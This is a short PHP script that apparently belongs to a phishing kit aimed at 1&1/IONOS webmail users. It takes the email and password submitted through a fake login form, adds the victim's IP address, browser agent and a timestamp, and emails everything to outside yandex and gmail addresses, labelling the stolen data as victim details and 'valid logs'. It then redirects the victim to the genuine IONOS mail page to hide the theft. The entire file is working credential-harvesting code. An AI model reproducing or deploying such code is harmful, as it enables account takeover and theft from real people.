<?php
header ('Location: https://mail.ionos.com/');
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$message .="**********1on1 Logins**********\n";
$message .="Email: $email\n";
$message .="Password: $password\n";
$message .="**********Victim PC Details**********\n";
$message .="Client IP: $ip\n";
$message .= "Browser:".$browserAgent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .="**********Created by sirusblack**********\n";
$subject ="Valid 1on1 logs";
mail("resultdemonx@yandex.com,screxxx147@gmail.com,resultdemonx@yandex.com", $subject, $message);
?>